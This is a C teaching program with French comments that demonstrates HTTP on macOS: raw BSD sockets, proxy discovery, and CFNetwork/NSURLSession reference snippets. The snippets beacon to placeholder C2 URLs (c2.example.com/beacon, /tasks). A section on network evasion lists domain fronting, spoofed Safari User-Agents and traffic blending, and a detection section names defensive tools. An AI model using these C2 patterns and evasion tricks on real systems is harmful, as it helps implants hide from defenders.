/*
 * OBJECTIF  : Comprendre les communications HTTP sur macOS
 * PREREQUIS : Bases C, reseau, HTTP, APIs macOS
 * COMPILE   : clang -o example example.c
 *
 * Ce programme demontre les techniques de communication HTTP
 * sur macOS : sockets BSD, CFNetwork, NSURLSession en C,
 * proxy systeme, et evasion reseau.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

/*
 * Etape 1 : Architecture reseau macOS
 */
static void explain_macos_network(void) {
    printf("[*] Etape 1 : Architecture reseau macOS\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Application                              │\n");
    printf("    │  ┌──────────────────────────────────┐    │\n");
    printf("    │  │ NSURLSession / CFNetwork          │    │\n");
    printf("    │  │ (haut niveau, proxy auto, TLS)    │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    │  ┌──────────────v───────────────────┐    │\n");
    printf("    │  │ libcurl (si disponible)           │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    │  ┌──────────────v───────────────────┐    │\n");
    printf("    │  │ BSD Sockets (bas niveau)          │    │\n");
    printf("    │  │ socket(), connect(), send()       │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    ├─────────────────┼────────────────────────┤\n");
    printf("    │  Kernel (XNU)   │                        │\n");
    printf("    │  TCP/IP stack   │ Network.framework      │\n");
    printf("    └─────────────────┴────────────────────────┘\n\n");

    printf("    Avantages de CFNetwork/NSURLSession :\n");
    printf("    - Configuration proxy automatique\n");
    printf("    - Gestion TLS/certificats systeme\n");
    printf("    - Se fond dans le trafic normal\n");
    printf("    - Support ATS (App Transport Security)\n\n");
}

/*
 * Etape 2 : Requete HTTP avec sockets BSD
 */
static void demo_http_request(void) {
    printf("[*] Etape 2 : Requete HTTP avec sockets BSD\n\n");

    const char *host = "example.com";
    const char *path = "/";
    int port = 80;

    /* Resolution DNS */
    printf("    Resolution DNS de %s :\n", host);
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int ret = getaddrinfo(host, "80", &hints, &res);
    if (ret != 0) {
        printf("      Erreur DNS : %s\n\n", gai_strerror(ret));
        return;
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    printf("      %s -> %s\n\n", host, ip);

    /* Construction de la requete HTTP */
    char request[1024];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
             "AppleWebKit/537.36\r\n"
             "Accept: text/html\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);

    printf("    Requete construite :\n");
    printf("    ───────────────────────────────────\n");
    printf("    GET %s HTTP/1.1\n", path);
    printf("    Host: %s\n", host);
    printf("    User-Agent: Mozilla/5.0 (Macintosh; ...)\n");
    printf("    Connection: close\n\n");

    /* Connexion et envoi */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("      Erreur socket : %s\n\n", strerror(errno));
        freeaddrinfo(res);
        return;
    }

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        printf("      Erreur connect : %s\n\n", strerror(errno));
        close(sock);
        freeaddrinfo(res);
        return;
    }

    send(sock, request, strlen(request), 0);

    /* Lecture de la reponse */
    char response[2048] = {0};
    ssize_t n = recv(sock, response, sizeof(response) - 1, 0);
    if (n > 0) {
        /* Afficher seulement les headers */
        char *body = strstr(response, "\r\n\r\n");
        if (body) *body = '\0';
        printf("    Reponse (headers) :\n");
        printf("    ───────────────────────────────────\n");
        char *line = strtok(response, "\r\n");
        int count = 0;
        while (line && count < 8) {
            printf("      %s\n", line);
            line = strtok(NULL, "\r\n");
            count++;
        }
    }
    printf("\n");

    close(sock);
    freeaddrinfo(res);
}

/*
 * Etape 3 : CFNetwork et NSURLSession (code reference)
 */
static void show_cfnetwork_code(void) {
    printf("[*] Etape 3 : CFNetwork / NSURLSession (reference)\n\n");

    printf("    CFNetwork (C, bas niveau Apple) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    #include <CFNetwork/CFNetwork.h>\n\n");
    printf("    CFURLRef url = CFURLCreateWithString(NULL,\n");
    printf("        CFSTR(\"https://c2.example.com/beacon\"), NULL);\n");
    printf("    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(\n");
    printf("        NULL, CFSTR(\"GET\"), url, kCFHTTPVersion1_1);\n");
    printf("    CFHTTPMessageSetHeaderFieldValue(req,\n");
    printf("        CFSTR(\"User-Agent\"),\n");
    printf("        CFSTR(\"Mozilla/5.0 (Macintosh)\"));\n\n");
    printf("    CFReadStreamRef stream =\n");
    printf("        CFReadStreamCreateForHTTPRequest(NULL, req);\n");
    printf("    CFReadStreamOpen(stream);\n\n");

    printf("    NSURLSession (Objective-C, appele depuis C) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Compiler avec -framework Foundation\n");
    printf("    #import <Foundation/Foundation.h>\n\n");
    printf("    NSURLSession *session =\n");
    printf("        [NSURLSession sharedSession];\n");
    printf("    NSURL *url = [NSURL URLWithString:\n");
    printf("        @\"https://c2.example.com/tasks\"];\n");
    printf("    NSURLSessionDataTask *task =\n");
    printf("        [session dataTaskWithURL:url\n");
    printf("         completionHandler:^(NSData *data,\n");
    printf("             NSURLResponse *resp, NSError *err) {\n");
    printf("             // Traiter la reponse\n");
    printf("         }];\n");
    printf("    [task resume];\n\n");

    printf("    Avantage : respecte les proxys systeme,\n");
    printf("    ATS, certificats, et se fond dans le trafic\n\n");
}

/*
 * Etape 4 : Configuration proxy macOS
 */
static void demo_proxy_detection(void) {
    printf("[*] Etape 4 : Detection du proxy macOS\n\n");

    printf("    macOS utilise les proxy systeme :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Preferences Systeme > Reseau > Proxy\n");
    printf("    - Auto-configuration (PAC)\n");
    printf("    - Variables d'environnement\n\n");

    /* Verifier les variables proxy */
    printf("    Variables d'environnement proxy :\n");
    const char *proxy_vars[] = {
        "http_proxy", "https_proxy", "HTTP_PROXY",
        "HTTPS_PROXY", "ALL_PROXY", "no_proxy", NULL
    };

    int found = 0;
    for (int i = 0; proxy_vars[i]; i++) {
        const char *val = getenv(proxy_vars[i]);
        if (val) {
            printf("      %s = %s\n", proxy_vars[i], val);
            found = 1;
        }
    }
    if (!found) printf("      (aucune variable proxy definie)\n");
    printf("\n");

    /* Verifier le proxy systeme via scutil */
    printf("    Proxy systeme (scutil) :\n");
    FILE *fp = popen("scutil --proxy 2>&1 | head -15", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\n")] = '\0';
            printf("      %s\n", line);
        }
        pclose(fp);
    }
    printf("\n");

    printf("    Code pour recuperer le proxy :\n");
    printf("    ───────────────────────────────────\n");
    printf("    #include <SystemConfiguration/SystemConfiguration.h>\n");
    printf("    CFDictionaryRef proxies =\n");
    printf("        SCDynamicStoreCopyProxies(NULL);\n");
    printf("    // Lire HTTPProxy, HTTPPort, etc.\n\n");
}

/*
 * Etape 5 : Evasion reseau macOS
 */
static void explain_evasion(void) {
    printf("[*] Etape 5 : Evasion reseau macOS\n\n");

    printf("    Techniques specifiques macOS :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Utiliser NSURLSession\n");
    printf("       -> Trafic identique a Safari/apps legit\n");
    printf("       -> Gere automatiquement les certificats\n\n");

    printf("    2. Domain fronting\n");
    printf("       -> TLS SNI vers domaine legitime\n");
    printf("       -> Host header vers le C2\n");
    printf("       -> Difficile a filtrer\n\n");

    printf("    3. User-Agent macOS realiste\n");
    printf("       -> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\n");
    printf("       -> AppleWebKit/605.1.15 (KHTML, like Gecko)\n");
    printf("       -> Version/16.1 Safari/605.1.15\n\n");

    printf("    4. Certificat TLS pinning evasion\n");
    printf("       -> Utiliser un certificat Let's Encrypt\n");
    printf("       -> Categorie CDN pour le domaine\n\n");

    printf("    5. mDNS / Bonjour pour reseau local\n");
    printf("       -> Se fond dans le trafic de decouverte\n");
    printf("       -> Pas de connexion Internet requise\n\n");

    printf("    Detection :\n");
    printf("    - Inspecter les connexions avec lsof -i\n");
    printf("    - Monitorer via Network.framework\n");
    printf("    - Little Snitch / LuLu (firewall applicatif)\n");
    printf("    - Endpoint Security NOTIFY_CONNECT\n\n");
}

/*
 * Etape 6 : Detection et monitoring
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et monitoring\n\n");

    printf("    Commandes de diagnostic :\n");
    printf("    ───────────────────────────────────\n");
    printf("    lsof -i -n -P              # Connexions actives\n");
    printf("    nettop -m tcp              # Trafic en temps reel\n");
    printf("    networksetup -listallnetworkservices\n\n");

    /* Afficher les connexions actives */
    printf("    Connexions TCP actives :\n");
    FILE *fp = popen("lsof -i -n -P 2>/dev/null | grep ESTABLISHED | head -10", "r");
    if (fp) {
        char line[512];
        int count = 0;
        while (fgets(line, sizeof(line), fp) && count < 10) {
            line[strcspn(line, "\n")] = '\0';
            printf("      %s\n", line);
            count++;
        }
        pclose(fp);
    }
    printf("\n");

    printf("    Outils de monitoring macOS :\n");
    printf("    - Little Snitch : firewall applicatif\n");
    printf("    - LuLu : firewall open-source (Objective-See)\n");
    printf("    - Wireshark : capture de paquets\n");
    printf("    - nettop : monitoring natif Apple\n");
    printf("    - Activity Monitor > Network\n\n");
}

int main(void) {
    printf("[*] Demo : HTTP Client macOS\n\n");

    explain_macos_network();
    demo_http_request();
    show_cfnetwork_code();
    demo_proxy_detection();
    explain_evasion();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
